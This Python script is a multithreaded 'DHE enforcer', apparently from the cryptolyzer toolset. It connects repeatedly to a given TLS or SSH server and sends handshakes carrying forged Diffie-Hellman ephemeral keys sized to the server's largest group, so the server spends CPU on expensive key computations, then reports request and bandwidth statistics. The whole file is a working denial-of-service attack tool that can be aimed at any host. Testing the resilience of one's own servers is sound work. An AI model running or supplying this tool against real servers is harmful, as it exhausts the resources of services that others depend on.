#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import os
import time
import socket
import struct
import threading

import abc
import attr
import urllib3

from cryptoparser.common.exception import InvalidType, NotEnoughData

from cryptoparser.tls.record import TlsRecord
from cryptoparser.tls.version import TlsProtocolVersionFinal, TlsVersion

from cryptoparser.ssh.record import SshRecordInit, SshRecordKexDH, SshRecordKexDHGroup
from cryptoparser.ssh.subprotocol import (
    SshProtocolMessage,
    SshKexAlgorithmVector,
    SshDHGroupExchangeInit,
    SshDHGroupExchangeRequest,
    SshDHKeyExchangeInit,
)
from cryptoparser.ssh.version import SshProtocolVersion, SshVersion

from cryptolyzer.common.dhparam import (
    WellKnownDHParams,
    get_dh_ephemeral_key_forged,
    int_to_bytes,
)
from cryptolyzer.common.exception import SecurityError, NetworkError
import cryptolyzer.tls.dhparams
import cryptolyzer.tls.versions
from cryptolyzer.tls.client import (
    L7ClientTlsBase,
    TlsHandshakeClientHelloKeyExchangeDHE,
)
import cryptolyzer.ssh.dhparams
from cryptolyzer.ssh.client import (
    L7ClientSsh,
    SshKeyExchangeInitAnyAlgorithm,
)


@attr.s(eq=False)
class DHEnforcerThreadStats(threading.Thread):
    failed_request_num = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    succeeded_request_num = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    sent_byte_count = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    received_byte_count = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    time_interval = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))


@attr.s(eq=False)
class DHEnforcerThreadBase(threading.Thread):
    uri = attr.ib(validator=attr.validators.instance_of(urllib3.util.url.Url))
    timeout = attr.ib(validator=attr.validators.instance_of(int))
    pre_check_result = attr.ib(
        default=None, validator=attr.validators.optional(attr.validators.instance_of(object))
    )
    message_bytes = attr.ib(init=False, default=bytearray(), validator=attr.validators.instance_of(bytearray))
    stop = attr.ib(init=False, default=False, validator=attr.validators.instance_of(bool))
    stats = attr.ib(
        init=False, default=DHEnforcerThreadStats(), validator=attr.validators.instance_of(DHEnforcerThreadStats)
    )

    @abc.abstractmethod
    def _get_client(self):
        raise NotImplementedError()

    @abc.abstractmethod
    def _prepare_packets(self):
        raise NotImplementedError()

    @abc.abstractmethod
    def _send_packets(self, client):
        raise NotImplementedError()

    @abc.abstractmethod
    def _pre_check(self):
        raise NotImplementedError()

    def __attrs_post_init__(self):
        if self.pre_check_result is None:
            self._pre_check()

        threading.Thread.__init__(self)

        self.message_bytes = self._prepare_packets()

    def run(self):
        start_time = time.time()
        while not self.stop:
            try:
                client = self._get_client()
                client.init_connection()
                sent_byte_count, received_byte_count = self._send_packets(client)
            except (ConnectionResetError, socket.timeout, socket.error, InvalidType, SecurityError, NotEnoughData):
                self.stats.failed_request_num += 1
            else:
                self.stats.received_byte_count += received_byte_count
                self.stats.sent_byte_count += sent_byte_count
                self.stats.succeeded_request_num += 1
        end_time = time.time()

        self.stats.time_interval = end_time - start_time


class DHEnforcerThreadSSH(DHEnforcerThreadBase):
    @abc.abstractmethod
    def _pre_check(self):
        analyzer = cryptolyzer.ssh.dhparams.AnalyzerDHParams()
        self.pre_check_result = analyzer.analyze(self._get_client())
        if self.pre_check_result.key_exchange is None and self.pre_check_result.group_exchange is None:
            raise NotImplementedError()

    def _get_client(self):
        if self.uri.scheme is None:
            scheme = 'ssh'
        else:
            scheme = self.uri.scheme

        return L7ClientSsh.from_scheme(scheme, self.uri.host, self.uri.port, self.timeout)

    def _get_algorithm_with_greatest_key_size(self):
        algorithm_with_greatest_key_size = None
        if self.pre_check_result.key_exchange.kex_algorithms:
            algorithm_with_greatest_key_size = sorted(
                self.pre_check_result.key_exchange.kex_algorithms,
                key=lambda algorithm: algorithm.value.key_size,
                reverse=True
            )[0]
        if (algorithm_with_greatest_key_size is None or
            (self.pre_check_result.group_exchange.key_sizes and
                self.pre_check_result.group_exchange.key_sizes[-1] > algorithm_with_greatest_key_size.value.key_size)):
            algorithm_with_greatest_key_size = self.pre_check_result.group_exchange.gex_algorithms[0]

        return algorithm_with_greatest_key_size

    def _prepare_packets(self):
        message_bytes = bytearray()
        protocol_message = SshProtocolMessage(
            protocol_version=SshProtocolVersion(SshVersion.SSH2, 0),
            software_version='DH-generator',
        )
        key_exchange_init_message = SshKeyExchangeInitAnyAlgorithm()
        message_bytes += protocol_message.compose()

        key_exchange_algorithm_with_greatest_key_size = self._get_algorithm_with_greatest_key_size()
        key_exchange_init_message.kex_algorithms = SshKexAlgorithmVector(
            [key_exchange_algorithm_with_greatest_key_size, ]
        )
        message_bytes += SshRecordInit(key_exchange_init_message).compose()

        if key_exchange_algorithm_with_greatest_key_size.value.key_size is not None:
            key_size = key_exchange_algorithm_with_greatest_key_size.value.key_size
        else:
            key_size = self.pre_check_result.group_exchange.key_sizes[-1]

        well_known_dh_param_with_matching_key_size = [
            well_known_dh_param
            for well_known_dh_param in WellKnownDHParams
            if well_known_dh_param.value.key_size == key_size
        ][0]
        dh_ephemeral_public_key = get_dh_ephemeral_key_forged(
            well_known_dh_param_with_matching_key_size.value.dh_param_numbers.p
        )
        dh_ephemeral_public_key_bytes = int_to_bytes(dh_ephemeral_public_key, key_size).lstrip(b'\x00')

        if key_exchange_algorithm_with_greatest_key_size.value.key_size is not None:
            dh_key_exchange_init_message = SshDHKeyExchangeInit(dh_ephemeral_public_key_bytes)
            message_bytes += SshRecordKexDH(dh_key_exchange_init_message).compose()
        else:
            dh_group_exchange_request_message = SshDHGroupExchangeRequest(
                gex_min=key_size, gex_max=key_size, gex_number=key_size
            )
            message_bytes += SshRecordKexDHGroup(dh_group_exchange_request_message).compose()

            dh_group_exchange_init_message = SshDHGroupExchangeInit(dh_ephemeral_public_key_bytes)
            message_bytes += SshRecordKexDHGroup(dh_group_exchange_init_message).compose()

        return message_bytes

    def _send_packets(self, client):
        sent_byte_count = client.send(self.message_bytes)
        received_byte_count = client.l4_transfer.receive_line()
        client.l4_transfer.flush_buffer()
        received_byte_count += client.l4_transfer.receive(4)
        received_byte_count += client.l4_transfer.receive(struct.unpack('!I', client.l4_transfer.buffer)[0])

        return sent_byte_count, received_byte_count


class DHEnforcerThreadTLS(DHEnforcerThreadBase):
    def _pre_check(self):
        analyzer = cryptolyzer.tls.versions.AnalyzerVersions()
        analyzer_result_versions = analyzer.analyze(self._get_client(), None)

        analyzer = cryptolyzer.tls.dhparams.AnalyzerDHParams()
        self.pre_check_result = analyzer.analyze(self._get_client(), min(analyzer_result_versions.versions))
        if not self.pre_check_result.dhparams:
            raise NotImplementedError()

    def _get_client(self):
        if self.uri.scheme is None:
            scheme = 'tls'
        else:
            scheme = self.uri.scheme

        return L7ClientTlsBase.from_scheme(scheme, self.uri.host, self.uri.port, self.timeout)

    def _prepare_packets(self):
        protocol_version = TlsProtocolVersionFinal(TlsVersion.TLS1_2)
        client_hello = TlsHandshakeClientHelloKeyExchangeDHE(protocol_version, self.uri.host)
        client_hello_bytes = TlsRecord(client_hello.compose()).compose()

        return client_hello_bytes

    def _send_packets(self, client):
        return client.send(self.message_bytes), 0


class ParseURI(argparse.Action):  # pylint: disable=too-few-public-methods
    def __init__(self, option_strings, dest, nargs=None, **kwargs):
        super().__init__(option_strings, dest, **kwargs)

    def __call__(
            self, parser, namespace, values, option_string=None, first=(True, )
    ):  # pylint: disable=too-many-arguments
        try:
            namespace.uri = urllib3.util.parse_url(values)
        except urllib3.exceptions.LocationParseError as e:
            raise argparse.ArgumentError(self, e.args[0])


def main():
    parser = argparse.ArgumentParser(description='Diffie-Hellman ephemeral key exchnage enforcer')
    parser.add_argument('--timeout', dest='timeout', default=5, help='socket timeout in seconds')
    parser.add_argument('--thread-num', dest='thread_mum', default=1, type=int, help='number of threads to run')
    parser.add_argument(
        '--protocol', dest='protocol', required=True, choices=['tls', 'ssh', ], help='name of the protocol'
    )
    parser.add_argument('uri', metavar='uri', action=ParseURI, help='uri of the service')

    args = parser.parse_args()
    threads = []

    try:
        pre_check_result = None
        for _ in range(args.thread_mum):
            try:
                if args.protocol == 'tls':
                    enforcer = DHEnforcerThreadTLS(args.uri, args.timeout, pre_check_result)
                elif args.protocol == 'ssh':
                    enforcer = DHEnforcerThreadSSH(args.uri, args.timeout, pre_check_result)
            except NetworkError as e:
                if pre_check_result is None:
                    print(
                        f'Network error oocuerd while checking whether Diffie-Hellman ephemeral (DHE) key exchange '
                        f'is supported by the server; uri="{args.uri}", error="{e}"'
                    )
                    return

                raise e from e

            pre_check_result = enforcer.pre_check_result
            threads.append(enforcer)
            enforcer.start()

        client = threads[0]._get_client()  # pylint: disable=protected-access
        print(os.linesep.join([
            '',
            '### Summary',
            '',
            '    * Thread num: {}',
            '    * Protocol: {}',
            '    * Address: {}',
            '    * IP: {}',
            '    * Port: {}',
        ]).format(
            args.thread_mum,
            client.get_scheme(),
            client.address,
            client.ip,
            client.port,
        ))

        while True:
            time.sleep(0.2)
    except NotImplementedError:
        print(
            f'Diffie-Hellman ephemeral (DHE) key exchange not supported by the server; '
            f'uri="{args.uri}", protocol="{args.protocol}"'
        )
    except KeyboardInterrupt:
        for thread in threads:
            thread.stop = True
            thread.join()

        if not threads or not all(map(lambda thread: thread.stats is not None, threads)):
            return
        output_template = os.linesep.join([
            '',
            '### Statistics',
            '',
            '* Requests',
            '    * Num: {}',
            '    * Speed: {:.2f} req/s',
            '    * Failed ratio: {:.2f} %',
            '    * Succeeded ratio: {:.2f} %',
            '* Bandwith',
            '    * Upload: {:.2f} KB/s',
            '    * Download: {:.2f} KB/s',
        ])
        output = output_template.format(
            sum([
                thread.stats.succeeded_request_num + thread.stats.failed_request_num
                for thread in threads
            ]),
            (sum([thread.stats.succeeded_request_num + thread.stats.failed_request_num for thread in threads]) /
                sum([thread.stats.time_interval for thread in threads])),
            sum([
                thread.stats.failed_request_num / (thread.stats.succeeded_request_num + thread.stats.failed_request_num)
                for thread in threads
                if thread.stats.succeeded_request_num or thread.stats.failed_request_num
            ]) * 100.0 / len(threads),
            sum([
                thread.stats.succeeded_request_num /
                (thread.stats.succeeded_request_num + thread.stats.failed_request_num)
                for thread in threads
                if thread.stats.succeeded_request_num or thread.stats.failed_request_num
            ]) * 100.0 / len(threads),
            (sum([thread.stats.sent_byte_count for thread in threads]) /
                sum([thread.stats.time_interval for thread in threads])) / 1000.0,
            (sum([thread.stats.received_byte_count for thread in threads]) /
                sum([thread.stats.time_interval for thread in threads])) / 1000.0,
        )
        print(output)


if __name__ == '__main__':
    main()
